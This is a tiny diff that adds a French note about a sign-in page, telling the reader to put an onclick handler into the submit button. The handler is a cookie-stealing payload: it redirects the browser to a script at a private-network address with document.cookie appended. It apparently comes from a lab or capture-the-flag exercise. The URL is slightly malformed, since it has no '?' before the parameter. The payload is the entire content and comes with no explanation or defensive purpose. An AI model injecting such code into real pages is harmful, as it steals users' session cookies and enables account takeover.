@@ -1,0 +1,3 @@
+Page signin
+
+mettre dans le bouton submit, onclick="javascript:window.location.replace('http://10.12.3.7:8000/test.phpc='+document.cookie)"
